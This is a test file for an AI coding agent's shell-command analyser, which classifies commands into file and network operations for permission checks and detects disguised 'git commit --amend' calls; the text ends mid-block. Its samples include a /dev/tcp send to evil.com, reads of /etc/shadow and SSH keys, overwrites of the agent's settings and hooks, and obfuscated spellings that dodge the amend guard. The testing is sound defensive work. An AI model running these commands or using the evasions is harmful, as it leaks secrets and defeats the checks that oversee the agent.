/**
 * @license
 * Copyright 2025 Qwen team
 * SPDX-License-Identifier: Apache-2.0
 */

import { describe, it, expect } from 'vitest';
import {
  classifyGitAmend,
  commandContainsGitAmend,
  extractShellOperations,
  extractShellOperationsAcrossCommand,
} from './shell-semantics.js';
import type { ShellOperation } from './shell-semantics.js';

const CWD = '/home/user/project';
const SETTINGS = `${CWD}/.qwen/settings.json`;
const REPO_SETTINGS = '/repo/.qwen/settings.json';

// Helper: sort ops for stable comparison
function sorted(ops: ShellOperation[]) {
  return [...ops].sort((a, b) =>
    `${a.virtualTool}:${a.filePath ?? ''}:${a.domain ?? ''}`.localeCompare(
      `${b.virtualTool}:${b.filePath ?? ''}:${b.domain ?? ''}`,
    ),
  );
}

const fileOp =
  (virtualTool: ShellOperation['virtualTool']) =>
  (filePath: string): ShellOperation => ({ virtualTool, filePath });
const read = fileOp('read_file');
const write = fileOp('write_file');
const edit = fileOp('edit');
const dir = fileOp('list_directory');
const web = (domain: string): ShellOperation => ({
  virtualTool: 'web_fetch',
  domain,
});
/** A write whose path was resolved against a cwd the analysis cannot know. */
const uncertainWrite = (
  filePath: string,
  pathMayDependOnCwd = true,
): ShellOperation => ({
  virtualTool: 'write_file',
  filePath,
  cwdUnknown: true,
  pathMayDependOnCwd,
});
const ops = (command: string) => extractShellOperations(command, CWD);
const across = (command: string) =>
  extractShellOperationsAcrossCommand(command, '/repo');
const expectSorted = (command: string, expected: ShellOperation[]) =>
  expect(sorted(ops(command))).toEqual(expected);
type Row = [title: string, command: string, expected: ShellOperation[]];

describe('extractShellOperations', () => {
  it.each<Row>([
    ['returns [] for empty string', '', []],
    ['returns [] for whitespace', '   ', []],
    ['returns [] for unknown commands', 'frobnicate /etc/passwd', []],
    ['returns [] for env-var assignments', 'FOO=bar', []],
    ['cat: absolute path', 'cat /etc/passwd', [read('/etc/passwd')]],
    [
      'cat: relative path resolved against cwd',
      'cat secrets.txt',
      [read(`${CWD}/secrets.txt`)],
    ],
    ['cat: flags are ignored', 'cat -n /etc/hosts', [read('/etc/hosts')]],
    [
      'cat: quoted path',
      "cat '/etc/my file.conf'",
      [read('/etc/my file.conf')],
    ],
    [
      'head: -n value not treated as path',
      'head -n 10 /var/log/syslog',
      [read('/var/log/syslog')],
    ],
    [
      'grep: first positional is pattern, rest are files',
      'grep password /etc/shadow',
      [read('/etc/shadow')],
    ],
    ['grep: -r becomes list_directory', 'grep -r secret /etc', [dir('/etc')]],
    // -f consumes patterns.txt and sets hasPatternFlag, so every positional
    // is a file path (no slice(1)).
    [
      'grep: -f patternfile — positionals are file paths',
      'grep -f patterns.txt /etc/hosts',
      [read('/etc/hosts')],
    ],
    [
      'grep: -n is line numbers and does not consume the pattern',
      'grep -n pattern /etc/hosts',
      [read('/etc/hosts')],
    ],
    [
      'grep: -A value not treated as path',
      'grep -A 3 error /var/log/app.log',
      [read('/var/log/app.log')],
    ],
    ['ls: no args defaults to cwd', 'ls', [dir(CWD)]],
    ['ls: explicit dir', 'ls /var/log', [dir('/var/log')]],
    [
      'find: first positional is starting dir',
      'find /etc -name "*.conf"',
      [dir('/etc')],
    ],
    ['find: no starting dir defaults to cwd', 'find -name "*.txt"', [dir(CWD)]],
    [
      'find: extracts write ops from exec clauses',
      'find . -exec cp payload .qwen/settings.json ;',
      [dir(CWD), read(`${CWD}/payload`), write(SETTINGS)],
    ],
    [
      'touch: creates a file (write_file)',
      'touch /tmp/new.txt',
      [write('/tmp/new.txt')],
    ],
    [
      'mkdir: creates a directory (write_file)',
      'mkdir -p /tmp/a/b',
      [write('/tmp/a/b')],
    ],
    [
      'rm: single file is edit',
      'rm /tmp/secret.txt',
      [edit('/tmp/secret.txt')],
    ],
    ['rm -rf: directory is edit', 'rm -rf /tmp/dir', [edit('/tmp/dir')]],
    [
      'chmod: mode arg is skipped, file is edit',
      'chmod 755 /usr/local/bin/script',
      [edit('/usr/local/bin/script')],
    ],
    [
      'chown: owner arg is skipped, file is edit',
      'chown root:root /etc/config',
      [edit('/etc/config')],
    ],
    [
      'sed without -i: read_file',
      "sed 's/foo/bar/' /etc/hosts",
      [read('/etc/hosts')],
    ],
    ['sed -i: edit', "sed -i 's/foo/bar/' /etc/hosts", [edit('/etc/hosts')]],
    [
      'sed combined short flags containing i: edit',
      "sed -nie 's/foo/bar/' /etc/hosts",
      [edit('/etc/hosts')],
    ],
    [
      'awk: program expression filtered, file identified',
      "awk '{print $1}' /etc/passwd",
      [read('/etc/passwd')],
    ],
    [
      'awk -F: separator consumed, file identified',
      "awk -F: '{print $2}' /etc/shadow",
      [read('/etc/shadow')],
    ],
    [
      'awk -i inplace: edits files in place',
      'awk -i inplace \'{gsub(/x/, "y")}1\' /etc/hosts',
      [edit('/etc/hosts')],
    ],
    [
      'awk --include=inplace: edits files in place',
      'awk --include=inplace \'{gsub(/x/, "y")}1\' /etc/hosts',
      [edit('/etc/hosts')],
    ],
    [
      'gawk -i inplace: edits files in place',
      'gawk -i inplace \'{gsub(/x/, "y")}1\' /etc/hosts',
      [edit('/etc/hosts')],
    ],
    [
      'redirect >: write_file',
      'echo hello > /tmp/out.txt',
      [write('/tmp/out.txt')],
    ],
    [
      'redirect >>: write_file',
      'date >> /var/log/app.log',
      [write('/var/log/app.log')],
    ],
    [
      'curl: extracts domain',
      'curl https://api.example.com/data',
      [web('api.example.com')],
    ],
    [
      'wget: extracts domain',
      'wget https://example.com/file.tar.gz',
      [web('example.com')],
    ],
    [
      'sudo cat: transparent wrapper',
      'sudo cat /etc/sudoers',
      [read('/etc/sudoers')],
    ],
    [
      'sudo -u user cat: strips flags before inner cmd',
      'sudo -u root cat /etc/shadow',
      [read('/etc/shadow')],
    ],
    [
      'env cmd: transparent wrapper',
      'env cat /etc/hosts',
      [read('/etc/hosts')],
    ],
    [
      'timeout cmd: transparent wrapper',
      'timeout 30 wget https://example.com',
      [web('example.com')],
    ],
    // $SECRET_FILE starts with $, filtered by looksLikePath
    ['$VAR paths are not included', 'cat $SECRET_FILE', []],
  ])('%s', (_title, command, expected) => {
    expect(ops(command)).toEqual(expected);
  });

  const curlOut = [web('api.example.com'), write('/tmp/out.json')];
  const wgetOut = [web('example.com'), write('/tmp/file.gz')];
  it.each<Row>([
    ['cat: multiple files', 'cat /a/b /c/d', [read('/a/b'), read('/c/d')]],
    [
      'tail: multiple files with flag',
      'tail -c 100 /a /b',
      [read('/a'), read('/b')],
    ],
    ['diff: two files', 'diff /old /new', [read('/new'), read('/old')]],
    [
      'grep: -e flag shifts all positionals to paths',
      'grep -e password /etc/passwd /etc/shadow',
      [read('/etc/passwd'), read('/etc/shadow')],
    ],
    [
      'cp: src=read, dst=write',
      'cp /etc/passwd /tmp/backup',
      [read('/etc/passwd'), write('/tmp/backup')],
    ],
    [
      'mv: src=edit, dst=write',
      'mv /tmp/a /tmp/b',
      [edit('/tmp/a'), write('/tmp/b')],
    ],
    [
      'sed -e: all positionals are files',
      "sed -e 's/foo/bar/' /a /b",
      [read('/a'), read('/b')],
    ],
    [
      'dd if= and of=',
      'dd if=/dev/sda of=/tmp/disk.img',
      [read('/dev/sda'), write('/tmp/disk.img')],
    ],
    [
      'rsync destination is a write',
      'rsync /tmp/payload .qwen/settings.json',
      [read('/tmp/payload'), write(SETTINGS)],
    ],
    [
      'curl: -o flag value emits write op and is not treated as URL',
      'curl -o /tmp/out.json https://api.example.com',
      curlOut,
    ],
    [
      'curl: attached -o flag value emits write op',
      'curl -o/tmp/out.json https://api.example.com',
      curlOut,
    ],
    [
      'curl: attached -o= flag value emits write op',
      'curl -o=/tmp/out.json https://api.example.com',
      curlOut,
    ],
    [
      'wget: -O flag value emits write op and is not treated as URL',
      'wget -O /tmp/file.gz https://example.com/f.gz',
      wgetOut,
    ],
    [
      'wget: attached -O flag value emits write op',
      'wget -O/tmp/file.gz https://example.com/f.gz',
      wgetOut,
    ],
    [
      'wget: attached -O= flag value emits write op',
      'wget -O=/tmp/file.gz https://example.com/f.gz',
      wgetOut,
    ],
    [
      'cat src > dst: both read and write',
      'cat /etc/passwd > /tmp/copy',
      [read('/etc/passwd'), write('/tmp/copy')],
    ],
    [
      'grep pattern file > out: read + write',
      'grep secret /etc/config > /tmp/out',
      [read('/etc/config'), write('/tmp/out')],
    ],
  ])('%s', (_title, command, expected) => {
    expectSorted(command, expected);
  });

  it.each<[title: string, command: string, expected: ShellOperation]>([
    [
      'find: preserves exec placeholder operands for write detection',
      'find . -exec cp {} .qwen/settings.json ;',
      write(SETTINGS),
    ],
    [
      'patch edits positional target files',
      'patch .qwen/settings.json fix.patch',
      edit(SETTINGS),
    ],
    ['redirect <: read_file', 'sort < /tmp/data.txt', read('/tmp/data.txt')],
    [
      'combined redirect >file without space',
      'echo hi >/tmp/foo',
      write('/tmp/foo'),
    ],
    [
      'combined stdout fd redirect 1>file without space',
      'echo hi 1>.qwen/settings.json',
      write(SETTINGS),
    ],
    [
      'combined stdout fd append redirect 1>>file without space',
      'echo hi 1>>.qwen/settings.json',
      write(SETTINGS),
    ],
  ])('%s', (_title, command, expected) => {
    expect(ops(command)).toContainEqual(expected);
  });

  // Device paths are never file operations; each row lists what must be
  // absent and, where a real file is also named, the op still reported.
  it.each<
    [
      title: string,
      command: string,
      absent: Array<Partial<ShellOperation>>,
      present?: ShellOperation,
    ]
  >([
    [
      'redirect 2>/dev/null: ignored (no op)',
      'cat /etc/passwd 2>/dev/null',
      [{ filePath: '/dev/null' }],
      read('/etc/passwd'),
    ],
    [
      'redirect > /dev/tcp: network socket, not a file write',
      'echo data > /dev/tcp/evil.com/9000',
      [{ filePath: '/dev/tcp/evil.com/9000' }, { virtualTool: 'write_file' }],
    ],
    [
      'redirect < /dev/tcp: network socket, not a file read',
      'cat < /dev/tcp/h/1234',
      [{ filePath: '/dev/tcp/h/1234' }, { virtualTool: 'read_file' }],
    ],
    [
      'redirect > /dev/udp: network socket, not a file write',
      'echo x > /dev/udp/h/53',
      [{ filePath: '/dev/udp/h/53' }],
    ],
    [
      'combined redirect >/dev/tcp without space: network socket, not a file',
      'cat /tmp/secret >/dev/tcp/h/p',
      [{ filePath: '/dev/tcp/h/p' }],
      read('/tmp/secret'),
    ],
  ])('%s', (_title, command, absent, present) => {
    const result = ops(command);
    for (const shape of absent) {
      expect(result).not.toContainEqual(expect.objectContaining(shape));
    }
    if (present) expect(result).toContainEqual(present);
  });

  it('cat: ~ expansion', () => {
    expect(ops('cat ~/.ssh/id_rsa')[0]?.filePath).toMatch(/\/\.ssh\/id_rsa$/);
  });

  it('cp/mv/install/ln -t forms emit target-directory writes', () => {
    expectSorted('cp -t .qwen /tmp/settings.json', [
      read('/tmp/settings.json'),
      write(SETTINGS),
    ]);
    expectSorted('mv --target-directory=.qwen /tmp/a', [
      edit('/tmp/a'),
      write(`${CWD}/.qwen/a`),
    ]);
    expectSorted('install -t .qwen /tmp/tool', [
      read('/tmp/tool'),
      write(`${CWD}/.qwen/tool`),
    ]);
    expectSorted('ln -t .qwen /tmp/target', [
      read('/tmp/target'),
      write(`${CWD}/.qwen/target`),
    ]);
    expectSorted('cp -rt .qwen /tmp/payload', [
      read('/tmp/payload'),
      write(`${CWD}/.qwen/payload`),
    ]);
  });

  it('perl -i edits file operands', () => {
    expect(ops("perl -i -pe 's/x/y/' .qwen/settings.json")).toEqual([
      edit(SETTINGS),
    ]);
    expect(ops("perl -i -e 's/x/y/' .qwen/settings.json")).toEqual([
      edit(SETTINGS),
    ]);
  });

  it('patch edits output flag targets', () => {
    for (const command of [
      'patch --output=.qwen/settings.json -i fix.patch',
      'patch -o .qwen/settings.json -i fix.patch',
    ]) {
      expect(ops(command)).toContainEqual(edit(SETTINGS));
    }
  });

  it('sort -o emits the output path as a write', () => {
    expectSorted('sort -o .qwen/settings.json /tmp/in', [
      read('/tmp/in'),
      write(SETTINGS),
    ]);
    expectSorted('sort --output=.qwen/settings.json /tmp/in', [
      read('/tmp/in'),
      write(SETTINGS),
    ]);
  });

  // `N>&M`, `>&M`, `N<&M` and `N>&-` duplicate or close a descriptor; bash
  // opens no file. They used to come back as a write to `<cwd>/&1`, which a
  // bare Edit/Write deny (the headless -p default) turned into a denial.
  it.each<[command: string, expected: ShellOperation[]]>([
    ['df -hT / 2>&1', []],
    ['df -hT / 1>&2', []],
    ['df -hT / >&2', []],
    ['df -hT / 2>&-', []],
    ['df -hT / >&-', []],
    ['cat <&0', []],
    ['df -hT / 2>&1 | head -5', []],
    ['df -hT / >&"1"', []],
    ['cat /etc/hosts 2>&1', [read('/etc/hosts')]],
    ['echo hi > out.txt 2>&1', [write(`${CWD}/out.txt`)]],
    ['echo hi 2>&1 >out.txt', [write(`${CWD}/out.txt`)]],
  ])('fd duplication is not a file operation: %s', (command, expected) => {
    expectSorted(command, expected);
  });

  it('>&file and 1>&file write the named file, not "&file"', () => {
    expect(ops('echo hi >&.qwen/settings.json')).toEqual([write(SETTINGS)]);
    expect(ops('echo hi 1>&.qwen/settings.json')).toEqual([write(SETTINGS)]);
  });

  // Bash writes a file named `&1` when the `&` is quoted or escaped.
  it.each<[command: string, file: string]>([
    ['printf TXT >"&1"', '&1'],
    ["printf TXT >'&1'", '&1'],
    ['printf TXT >\\&1', '&1'],
    ['printf TXT 2>"&1"', '&1'],
    ['printf TXT >"&"1', '&1'],
    ['printf TXT >"&protected.txt"', '&protected.txt'],
    ['printf TXT >\\&protected.txt', '&protected.txt'],
    ['printf TXT >"x&"', 'x&'],
    ['printf TXT >"notes)"', 'notes)'],
    ["printf TXT >'notes)'", 'notes)'],
    ['printf TXT >notes\\)', 'notes)'],
    ['printf TXT >"&"', '&'],
    ['printf TXT >\\&', '&'],
  ])('quoted or escaped & is part of the file name: %s', (command, file) => {
    expect(ops(command)).toEqual([write(`${CWD}/${file}`)]);
  });

  it('>&$VAR keeps the literal write: it may name a file', () => {
    expect(ops('printf TXT >&$OUT')).toEqual([write(`${CWD}/&$OUT`)]);
  });

  // Only a whole number or `-` is a descriptor; anything else names a file.
  // (`2>&file` and `<&file` are errors in bash; reporting them keeps the
  // check strict.)
  it.each<[command: string, expected: ShellOperation[]]>([
    ['printf TXT >&1.log', [write(`${CWD}/1.log`)]],
    ['printf TXT >&2fa-notes.md', [write(`${CWD}/2fa-notes.md`)]],
    ['printf TXT 2>&protected.txt', [write(`${CWD}/protected.txt`)]],
    ['cat <&protected.txt', [read(`${CWD}/protected.txt`)]],
    ['printf TXT >&"y)"', [write(`${CWD}/y)`)]],
  ])('fd redirect word: %s', (command, expected) => {
    expectSorted(command, expected);
  });

  // After an unquoted `>&`, `N>&` or `<&`, bash reads an unquoted `-` as
  // "close" and starts a new word: `rm >&-notes.txt` closes stdout and
  // removes notes.txt. The command gets that word as an argument, and the
  // whole word also stays a file operation (`&-word`), because the parser
  // doesn't know every command and drops numbers and `$` words as arguments:
  // `tee >&-2` writes `2`, `my-tool >&-notes.txt` may write notes.txt.
  it.each<[command: string, expected: ShellOperation[]]>([
    [
      'rm >&-notes.txt',
      [edit(`${CWD}/notes.txt`), write(`${CWD}/&-notes.txt`)],
    ],
    [
      'rm 1>&-notes.txt',
      [edit(`${CWD}/notes.txt`), write(`${CWD}/&-notes.txt`)],
    ],
    [
      'rm 2>&-notes.txt',
      [edit(`${CWD}/notes.txt`), write(`${CWD}/&-notes.txt`)],
    ],
    ['rm <&-notes.txt', [edit(`${CWD}/notes.txt`), read(`${CWD}/&-notes.txt`)]],
    [
      'rm >&-"notes.txt"',
      [edit(`${CWD}/notes.txt`), write(`${CWD}/&-notes.txt`)],
    ],
    [
      'cat <&-notes.txt',
      [read(`${CWD}/&-notes.txt`), read(`${CWD}/notes.txt`)],
    ],
    ['printf TXT >&-x', [write(`${CWD}/&-x`)]],
    ['tee >&-2', [write(`${CWD}/&-2`)]],
    ['tee 2>&-2', [write(`${CWD}/&-2`)]],
    ['cat <&-2', [read(`${CWD}/&-2`)]],
    ['tee >&-$HOME/.bashrc', [write(`${CWD}/&-$HOME/.bashrc`)]],
    ['tee >&-{a,b}', [write(`${CWD}/&-{a,b}`)]],
    ['my-tool >&-notes.txt', [write(`${CWD}/&-notes.txt`)]],
    ['rm -- >&--x', [write(`${CWD}/&--x`)]],
    ['printf X >&->&"-x"', [write(`${CWD}/-x`), write(`${CWD}/&->&-x`)]],
    // A closed descriptor can close again: each `>&-` starts a new word, and
    // only the first redirect reports the whole word.
    [
      'rm >&->&-notes.txt',
      [edit(`${CWD}/notes.txt`), write(`${CWD}/&->&-notes.txt`)],
    ],
    [
      'rm >&-<&-notes.txt',
      [edit(`${CWD}/notes.txt`), write(`${CWD}/&-<&-notes.txt`)],
    ],
    [
      'rm >&-2>&-notes.txt',
      [edit(`${CWD}/notes.txt`), write(`${CWD}/&-2>&-notes.txt`)],
    ],
    ['printf X >&->&-', [write(`${CWD}/&->&-`)]],
    ['tee >&->&y', [write(`${CWD}/&->&y`), write(`${CWD}/y`)]],
    ['df -hT / >&-', []],
    ['df -hT / >&"-"', []],
  ])('unquoted - closes the descriptor: %s', (command, expected) => {
    expectSorted(command, expected);
  });

  // A long chain of closes in one word is walked in a loop: it must not
  // overflow the stack, and the whole word is reported once.
  it.each(['>&-', '<&-', '2>&-'])('a long chain of %s returns', (unit) => {
    const command = `rm ${unit.repeat(20000)}notes.txt`;
    const result = ops(command);
    expect(result).toHaveLength(2);
    expect(result).toContainEqual(edit(`${CWD}/notes.txt`));
  });

  // A quoted or escaped `)` is part of the word; a bare one closes a subshell.
  it.each<[command: string, expected: ShellOperation[]]>([
    ['(echo hi >out.txt)', [write(`${CWD}/out.txt`)]],
    ['(echo hi > out.txt)', [write(`${CWD}/out.txt`)]],
    ['cat "notes)"', [read(`${CWD}/notes)`)]],
    ['rm notes\\)', [edit(`${CWD}/notes)`)]],
  ])('trailing ): %s', (command, expected) => {
    expectSorted(command, expected);
  });

  // `>&` and `<&` aimed at a device: bash discards the output or opens a
  // socket, so no file operation.
  it.each<string>([
    'df -hT / >&/dev/null',
    'df -hT / 1>&/dev/null',
    'cat <&/dev/null',
    'printf TXT >&/dev/tcp/127.0.0.1/80',
  ])('fd redirect to a device is not a file operation: %s', (command) => {
    expectSorted(command, []);
  });

  // A quoted `>` is not a redirect, so `2">"&1` is not fd duplication; bash
  // reads the unquoted `&` as "run in background", and the check keeps the
  // literal write.
  it('2">"&1 is not fd duplication', () => {
    expect(ops('printf X 2">"&1')).toContainEqual(write(`${CWD}/&1`));
  });

  // A quoted or escaped `-` is part of the file name: `>&"-x"` writes `-x`.
  it.each<[command: string, file: string]>([
    ['printf TXT >&"-x"', '-x'],
    ["printf TXT >&'-x'", '-x'],
    ['printf TXT >&\\-x', '-x'],
    ['printf TXT 1>&"-x"', '-x'],
    ['printf TXT >&"-1"', '-1'],
    ['rm >&"-"notes.txt', '-notes.txt'],
  ])('quoted or escaped - after >& names a file: %s', (command, file) => {
    expect(ops(command)).toEqual([write(`${CWD}/${file}`)]);
  });

  it('regression: ordinary file redirects still tracked', () => {
    expect(ops('echo hi > out.txt')).toContainEqual(write(`${CWD}/out.txt`));
    expect(ops('sort < in.txt')).toContainEqual(read(`${CWD}/in.txt`));
  });
});

// Shared compound shell analysis for permission rules and AUTO review.
describe('extractShellOperationsAcrossCommand', () => {
  it.each<Row>([
    [
      'tracks literal `cd` across compound segments before resolving writes',
      "cd .qwen && bash -lc 'echo {} > settings.json'",
      [write(REPO_SETTINGS)],
    ],
    [
      'handles leading env assignments before redirected commands',
      'FOO=bar echo x > .qwen/settings.json',
      [write(REPO_SETTINGS)],
    ],
    [
      'handles leading env assignments before write commands',
      'FOO=bar tee .qwen/settings.json',
      [write(REPO_SETTINGS)],
    ],
    [
      'tracks cwd before leading env assignments',
      "cd .qwen && FOO=bar echo '{}' > settings.json",
      [write(REPO_SETTINGS)],
    ],
    // The foreground form below cannot know where it landed; the backgrounded
    // one can, because it did not move the cwd at all.
    [
      'does not mark later paths uncertain for a backgrounded dynamic `cd`',
      'cd "$TARGET" & echo {} > settings.json',
      [write('/repo/settings.json')],
    ],
    // Over-correction guards: only the backgrounded `cd` is exempt. Both of
    // these pass before and after the change.
    [
      'keeps a foreground `cd` moving the cwd',
      'cd /tmp && echo {} > settings.json',
      [write('/tmp/settings.json')],
    ],
    [
      'keeps a foreground dynamic `cd` marking later paths uncertain',
      'cd "$TARGET" && echo {} > settings.json',
      [uncertainWrite('/repo/settings.json')],
    ],
    [
      'applies a foreground `cd` that follows a backgrounded one',
      'cd /tmp & cd /var && echo {} > settings.json',
      [write('/var/settings.json')],
    ],
    // The actual write is nested two wrapper levels deep.
    [
      'recursively unwraps nested shell wrappers',
      'bash -lc "sh -c \'echo hi > .mcp.json\'"',
      [write('/repo/.mcp.json')],
    ],
    [
      'preserves sibling segments after a shell wrapper',
      "bash -lc 'echo ok' && echo hi > .qwen/settings.json",
      [write(REPO_SETTINGS)],
    ],
    [
      'splits literal newlines as command boundaries',
      'cd .qwen\ncp /tmp/malicious settings.json',
      [read('/tmp/malicious'), write(REPO_SETTINGS)],
    ],
    [
      'tracks cwd through brace-grouped commands',
      "{ cd .qwen && echo '{}' > settings.json; }",
      [write(REPO_SETTINGS)],
    ],
    [
      'strips grouping and background syntax from command and path tokens',
      '(echo > .qwen/settings.json) && echo > .qwen/hooks/run.sh&',
      [write(REPO_SETTINGS), write('/repo/.qwen/hooks/run.sh')],
    ],
    [
      'does not treat heredoc body lines as executable shell segments',
      [
        'cd .qwen',
        "cat <<'EOF'",
        'cd /tmp',
        'EOF',
        'echo > settings.json',
      ].join('\n'),
      [write(REPO_SETTINGS)],
    ],
    [
      'does not treat quoted heredoc-looking text as a heredoc marker',
      ["echo '<<EOF'", 'cd .qwen', "echo '{}' > settings.json"].join('\n'),
      [write(REPO_SETTINGS)],
    ],
    [
      'handles `cd --` and other POSIX flag forms before the target',
      "cd -- .qwen && printf '{}' > settings.local.json",
      [write('/repo/.qwen/settings.local.json')],
    ],
    [
      'treats the word after `cd --` as the target even when it starts with dash',
      "cd -- -some-dir && printf '{}' > settings.local.json",
      [write('/repo/-some-dir/settings.local.json')],
    ],
    [
      'resolves the static cwd even when the cd segment carries a >/dev/null redirect',
      "cd .qwen >/dev/null && echo '{}' > settings.json",
      [write(REPO_SETTINGS)],
    ],
    [
      'reports a redirect on a static cd segment from the starting cwd',
      "cd .qwen > settings.json && echo '{}' > settings.local.json",
      [write('/repo/settings.json'), write('/repo/.qwen/settings.local.json')],
    ],
    [
      'reports a redirect on a dynamic cd segment from the current cwd',
      'cd $TARGET > settings.json',
      [write('/repo/settings.json')],
    ],
    [
      'marks a later cd redirect as cwd-unknown after a dynamic cd',
      'cd $TARGET && cd .qwen > settings.json',
      [uncertainWrite('/repo/settings.json')],
    ],
    [
      'reports a redirect on a backgrounded cd segment without moving cwd',
      "cd .qwen > settings.json & echo '{}' > settings.local.json",
      [write('/repo/settings.json'), write('/repo/settings.local.json')],
    ],
    [
      'tracks static pushd targets like cd targets',
      "pushd .qwen && printf '{}' > settings.local.json",
      [write('/repo/.qwen/settings.local.json')],
    ],
    [
      'marks writes after popd as cwd-unknown',
      "popd && printf '{}' > settings.local.json",
      [uncertainWrite('/repo/settings.local.json')],
    ],
    [
      'marks writes after popd with expansion args as cwd-unknown',
      "popd $DIR && printf '{}' > settings.local.json",
      [uncertainWrite('/repo/settings.local.json')],
    ],
    // Keep the guessed path, but mark it unsafe to trust as final.
    [
      'marks relative writes after dynamic `cd` targets as cwd-unknown',
      'cd $TARGET && echo hi > out.txt',
      [uncertainWrite('/repo/out.txt')],
    ],
    [
      'marks all file ops after dynamic `cd` as cwd-unknown',
      'cd "$QWEN_HOME" && echo hi > ../settings.json',
      [uncertainWrite('/settings.json')],
    ],
    [
      'clears cwd-unknown after an absolute static `cd`',
      'cd $TARGET && cd /repo/.qwen && echo hi > settings.json',
      [write(REPO_SETTINGS)],
    ],
    [
      'preserves operation order across compound segments',
      'echo a > one.txt && cd sub && echo b > two.txt; cat /etc/hosts',
      [write('/repo/one.txt'), write('/repo/sub/two.txt'), read('/etc/hosts')],
    ],
    [
      'returns no ops when only `cd` segments are present',
      'cd .qwen && cd ..',
      [],
    ],
  ])('%s', (_title, command, expected) => {
    expect(across(command)).toEqual(expected);
  });

  // A backgrounded `cd` runs in a subshell, so the parent's cwd is untouched
  // and the next segment's relative write lands in the *original* directory —
  // which is exactly where a protected settings file lives. Attributing the
  // write to the `cd` target instead would check the wrong path.
  it.each([
    ['cd /tmp & echo {} > settings.json'],
    ['cd .qwen & echo {} > settings.json'],
  ])('does not move the cwd for the backgrounded `cd` in %s', (command) => {
    expect(across(command)).toEqual([write('/repo/settings.json')]);
  });

  it.each(['pushd', 'pushd +2', 'pushd -2', 'pushd -n /tmp'])(
    'marks writes after `%s` as cwd-unknown',
    (command) => {
      expect(across(`${command} && printf '{}' > settings.local.json`)).toEqual(
        [uncertainWrite('/repo/settings.local.json')],
      );
    },
  );

  it('does not mark absolute writes after dynamic `cd` as cwd-dependent', () => {
    for (const command of [
      'cd "$QWEN_HOME" && echo hi > /tmp/out.txt',
      'cd "$QWEN_HOME" && echo hi 1>/tmp/out.txt',
      'cd "$QWEN_HOME" && echo hi >&/tmp/out.txt',
      'cd "$QWEN_HOME" && echo hi 1>&/tmp/out.txt',
    ]) {
      expect(across(command)).toEqual([uncertainWrite('/tmp/out.txt', false)]);
    }
    expect(across('cd "$QWEN_HOME" && cat <&/tmp/in.txt')).toEqual([
      {
        virtualTool: 'read_file',
        filePath: '/tmp/in.txt',
        cwdUnknown: true,
        pathMayDependOnCwd: false,
      },
    ]);
    // A quoted `&` is part of a relative name: `&/tmp/out.txt` in the cwd.
    expect(across('cd "$QWEN_HOME" && echo hi >"&"/tmp/out.txt')).toEqual([
      uncertainWrite('/repo/&/tmp/out.txt'),
    ]);
  });

  it('falls back gracefully on excessively deep wrapper nesting', () => {
    // A pathological chain hits MAX_SHELL_UNWRAP_DEPTH (4) and the remainder
    // is analysed as-is instead of recursing forever. The result does not
    // matter, only that the call returns without throwing or hanging.
    const deep = 'bash -lc "bash -lc \\"bash -lc \'bash -lc echo > x.txt\'\\""';
    expect(() => across(deep)).not.toThrow();
  });
});

describe('line continuations before a `$` construct', () => {
  it('reads the ANSI-C word the continuation interrupts (#16075 review, R7-1)', () => {
    // The shell removes `\`+newline before it lexes, so the ANSI-C opener it
    // interrupts is the word bash runs; `$` + continuation + `'` is not a
    // dangling `$` followed by an unrelated quoted word.
    const literal = ops("mv /tmp/a $'/tmp/protected/x'");
    expect(literal).not.toEqual([]);
    expect(ops("mv /tmp/a $\\\n'/tmp/protected/x'")).toEqual(literal);
  });
});

describe('commandContainsGitAmend fail-closed backstop (#16075 R9 B1)', () => {
  // The recognizer may only ADD denials to the base substring guard. These
  // pin the backstop at the unit level; the end-to-end denial table lives in
  // destructive-commands.test.ts.
  it.each([
    // Recognizer-missed spellings from doudouOUC's B1 probe: the literal
    // phrase is present, no inert proof applies, so the backstop denies.
    "X='git commit --amend --no-edit'; $X",
    "trap 'git commit --amend --no-edit' EXIT",
    "echo 'git commit --amend --no-edit' | cat | bash",
    "env -u FOO -S 'git commit --amend --no-edit'",
    // The phrase exists only in the wrapper-stripped expansion: zero raw
    // occurrences are unclassifiable, not vacuously inert.
    "bash -c '--amend' git commit",
  ])('denies an unproven literal phrase: %s', (command) => {
    expect(commandContainsGitAmend(command)).toBe(true);
  });

  it.each([
    "echo 'git commit --amend'",
    "grep 'git commit --amend' file.txt",
    'git status # git commit --amend',
    "cat <<'EOF'\ngit commit --amend\nEOF",
    // No phrase at all: the backstop must not fire on unrelated commands.
    'git status',
    'git commit -m "fix"',
    "echo 'set $IFS'",
  ])('allows provably inert or phrase-free commands: %s', (command) => {
    expect(commandContainsGitAmend(command)).toBe(false);
  });

  it('keeps recognizer denials that the raw phrase test cannot see', () => {
    // Quote-split spellings the base regex never matched stay denied by the
    // recognizer layer alone.
    expect(
      commandContainsGitAmend('git${IFS}commit${IFS}--amend --no-edit'),
    ).toBe(true);
    expect(
      commandContainsGitAmend("bash -c $'git commit --amend\\x3btrue'"),
    ).toBe(true);
  });

  // R9-1: the heredoc owner is resolved quote-aware per operator, every body
  // on the opener line is read, and the LAST here-string is the one bash
  // feeds to the program. Each body hides the phrase behind ANSI-C quoting,
  // so only the shell-fed heredoc/here-string arms can see it.
  it.each([
    "echo \"a << b\" && bash <<'EOF'\ngit commit $'--amend' --no-edit\nEOF",
    "bash <<'A' <<'B'\necho hi\nA\ngit commit $'--amend' --no-edit\nB",
    "bash <<< 'echo hi' <<< $'git\\x20commit\\x20--amend --no-edit'",
  ])('reads the body the shell actually executes: %s', (command) => {
    expect(commandContainsGitAmend(command)).toBe(true);
  });

  // R10-2: a path-qualified program word may be any executable the caller
  // placed there; the inert certificate is for bare allowlisted names only.
  // The bare-name rows in the allow table above must stay allowed.
  it.each([
    "./cat <<'EOF'\ngit commit --amend\nEOF",
    "/bin/cat <<'EOF'\ngit commit --amend\nEOF",
    "/tmp/grep 'git commit --amend' f.txt",
    "./echo 'git commit --amend'",
  ])(
    'refuses the inert certificate for a path-qualified program: %s',
    (command) => {
      expect(commandContainsGitAmend(command)).toBe(true);
    },
  );
});

// R1-1: wrapper spellings that really amend HEAD (witnessed with bash 5 and
// git 2.x) but whose payload the old scans mislocated — an operand read as
// the program, an option value skipped, a cluster tail read as an attached
// payload bash never takes. Each row must be denied by the recognizer.
describe('commandContainsGitAmend wrapper payload attribution (#16075 R1-1)', () => {
  it.each([
    // The acceptance row: the outer shell removes the backslashes before
    // bash reads the payload, so the payload is `git commit --amend`.
    'bash -c git\\ commit\\ --amend',
    // xargs value flags consume their operand; the program follows it.
    "ls | xargs -I {} sh -c 'git commit -m x --amend'",
